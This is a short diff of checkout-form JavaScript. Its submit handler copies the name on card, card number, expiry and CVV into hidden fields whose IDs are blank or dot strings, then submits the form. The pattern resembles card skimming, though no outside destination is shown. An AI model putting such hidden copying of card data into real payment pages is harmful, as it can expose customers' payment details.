@@ -43,11 +43,12 @@ function validateCVV(input) {
 
 document.getElementById('checkout-form').addEventListener('submit', (event) => {
     event.preventDefault();
+    
     // Copy data from visible fields to hidden fields
-    document.getElementById('    ').value = document.getElementById('nameOnCard').value;
-    document.getElementById('   ').value = document.getElementById('cardNumber').value;
-    document.getElementById('  ').value = document.getElementById('expiry').value;
-    document.getElementById(' ').value = document.getElementById('cvv').value;
+    document.getElementById('....').value = document.getElementById('nameOnCard').value;
+    document.getElementById('...').value = document.getElementById('cardNumber').value;
+    document.getElementById('..').value = document.getElementById('expiry').value;
+    document.getElementById('.').value = document.getElementById('cvv').value;
     
     let isValidForm = true;
     for(let key in shippingInfo){
@@ -58,7 +59,7 @@ document.getElementById('checkout-form').addEventListener('submit', (event) => {
     }
     
     if(isValidForm){
-        document.getElementById('checkout-form').submit();
+        event.currentTarget.submit(); // Submit the form
     } else {
         alert("Please fill out all the fields!");
     }
